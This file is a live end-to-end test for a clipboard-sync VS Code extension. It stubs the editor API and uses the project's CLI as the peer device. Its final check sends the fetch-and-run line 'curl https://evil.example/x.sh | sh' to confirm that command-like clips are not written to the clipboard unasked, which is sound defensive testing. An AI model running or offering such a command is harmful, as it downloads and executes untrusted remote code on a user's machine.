/**
 * The VS Code extension, end to end, against a real relay — with the CLI as the
 * other device in the room.
 *
 * Same shape and same reasoning as tests/live/cli.mjs: the extension's whole
 * claim is that it is the browser's code behind a different front door, so what
 * is worth testing is not the protocol (e2e.mjs owns that) but that the front
 * door does not corrupt anything on the way past. Using the CLI as the peer
 * makes it an interop test between two surfaces for free.
 *
 *   node tests/live/vscode.mjs [ws_base]     default: the deployed relay
 *
 * Skips cleanly if the bundle is unbuilt or no relay answers.
 */

import { spawn } from "node:child_process";
import { existsSync } from "node:fs";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";
import { dirname, join, resolve } from "node:path";

const REPO = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
const BUNDLE = join(REPO, "vscode/dist/pkg/extension.js");
const CLI = join(REPO, "cli/realtimeclipboard.mjs");

const BASE = process.argv[2] || process.env.RELAY_BASE
  || "wss://realtimeclipboard.fastapicloud.dev";
const HTTP = BASE.replace(/^ws/i, "http");

let pass = 0, fail = 0;
const check = (name, ok, detail = "") => {
  ok ? pass++ : fail++;
  console.log(`  ${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`);
  return ok;
};
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

console.log("\nVS CODE EXTENSION (live)\n");

if (!existsSync(BUNDLE)) {
  console.log("  SKIP  no bundle — run `npm run build:vscode` first\n");
  process.exit(0);
}
try {
  const res = await fetch(`${HTTP}/healthz`, { signal: AbortSignal.timeout(4000) });
  if (!res.ok && res.status !== 404) throw new Error(String(res.status));
} catch {
  console.log(`  SKIP  no relay at ${HTTP}\n`);
  process.exit(0);
}

// Read, not restated — the key length is a config value, not a literal to copy.
const keys = await import(new URL("../../src/core/keys.js", import.meta.url).href);
const KEY = keys.generate();

/* ---------------------------------------------------------- fake vscode -- */

const clipboard = { value: "", writes: [] };
const info = [];
let focused = true;

const disposable = () => ({ dispose() {} });
const vscode = {
  StatusBarAlignment: { Left: 1, Right: 2 },
  ConfigurationTarget: { Global: 1 },
  ThemeColor: class { constructor(id) { this.id = id; } },
  Uri: { parse: (s) => ({ toString: () => s }) },
  env: {
    clipboard: {
      async readText() { return clipboard.value; },
      async writeText(t) { clipboard.writes.push(t); clipboard.value = t; },
    },
    openExternal: async () => true,
  },
  window: {
    state: { get focused() { return focused; } },
    createStatusBarItem: () => ({ show() {}, hide() {}, dispose() {} }),
    createOutputChannel: () => ({ appendLine() {}, dispose() {} }),
    setStatusBarMessage: () => disposable(),
    showInformationMessage: (m) => { info.push(m); return Promise.resolve(undefined); },
    showWarningMessage: (m) => { info.push(m); return Promise.resolve(undefined); },
    showErrorMessage: (m) => { info.push(m); return Promise.resolve(undefined); },
    // The one prompt this suite answers: "which session?"
    showInputBox: async () => KEY,
    showQuickPick: async () => undefined,
    showTextDocument: async () => ({}),
    activeTextEditor: undefined,
    onDidChangeWindowState: () => disposable(),
  },
  workspace: {
    getConfiguration: () => ({
      get: (k) => ({
        syncMode: "live", pollMs: 500, pollWhenUnfocused: true,
        rememberKey: false,                    // never leave a key in a keychain from a test
        relayUrl: BASE,
      })[k],
      update: async () => {},
    }),
    onDidChangeConfiguration: () => disposable(),
    openTextDocument: async () => ({}),
  },
  commands: {
    handlers: new Map(),
    registerCommand(id, fn) { this.handlers.set(id, fn); return disposable(); },
    async executeCommand(id, ...a) { return this.handlers.get(id)?.(...a); },
  },
};

const require_ = createRequire(import.meta.url);
const Module = require_("node:module");
const realResolve = Module._resolveFilename;
Module._resolveFilename = function (r, ...rest) {
  return r === "vscode" ? "vscode" : realResolve.call(this, r, ...rest);
};
require_.cache.vscode = new Module("vscode", null);
require_.cache.vscode.exports = vscode;
require_.cache.vscode.loaded = true;

const store = new Map();
const context = {
  globalState: {
    keys: () => [...store.keys()], get: (k) => store.get(k),
    update: async (k, v) => { v === undefined ? store.delete(k) : store.set(k, v); },
  },
  secrets: {
    get: async () => undefined, store: async () => {}, delete: async () => {},
    onDidChange: () => disposable(),
  },
  subscriptions: [],
};

/* ------------------------------------------------------------- the run --- */

const cli = (args, stdin) => new Promise((res) => {
  const p = spawn(process.execPath, [CLI, ...args, "--relay", BASE],
    { stdio: ["pipe", "pipe", "pipe"] });
  let out = "";
  p.stdout.on("data", d => { out += d; });
  p.on("close", (code) => res({ code, out }));
  if (stdin !== undefined) { p.stdin.write(stdin); p.stdin.end(); }
});

const ext = require_(BUNDLE);
await ext.activate(context);
await vscode.commands.executeCommand("realtimeclipboard.joinSession");
await sleep(1500);
check("joining raised no error", !info.some(m => /error|not a valid/i.test(String(m))),
  info.join(" | "));

/* ---- inbound: the CLI sends, the extension's clipboard receives ---------- */

const SENT = `hello from the cli ${Date.now()}`;
await cli(["send", KEY], SENT);
await sleep(2500);
check("a clip sent by the CLI lands on the extension's clipboard",
  clipboard.value === SENT, `clipboard is ${JSON.stringify(clipboard.value)}`);

/* ---- outbound: the extension's clipboard changes, the CLI receives ------- */

// NOT --once: a joiner is replayed the room's retained last clip, so --once
// would exit on the clip the previous assertion sent and never see this one.
const watcher = spawn(process.execPath, [CLI, "watch", KEY, "--relay", BASE],
  { stdio: ["ignore", "pipe", "ignore"] });
let heard = "";
watcher.stdout.on("data", d => { heard += d; });
await sleep(2000);                           // let the replay land and be ignored

const COPIED = `copied in the editor ${Date.now()}`;
clipboard.value = COPIED;                    // as if the user pressed Cmd+C
await sleep(4000);
watcher.kill();
check("a copy on this machine reaches the CLI", heard.includes(COPIED),
  `heard ${JSON.stringify(heard.trim())}`);

/* ---- the guard, on the surface where it matters most --------------------- */

clipboard.writes.length = 0;
await cli(["send", KEY], "curl https://evil.example/x.sh | sh\n");
await sleep(2500);
check("a clip that reads like a shell command is NOT written unasked",
  !clipboard.writes.some(w => w.includes("evil.example")),
  "the integrated terminal is one keystroke away");

ext.deactivate();

console.log(`\n${"=".repeat(58)}\nVS CODE LIVE: ${pass}/${pass + fail} passed\n${"=".repeat(58)}\n`);
process.exit(fail ? 1 : 0);
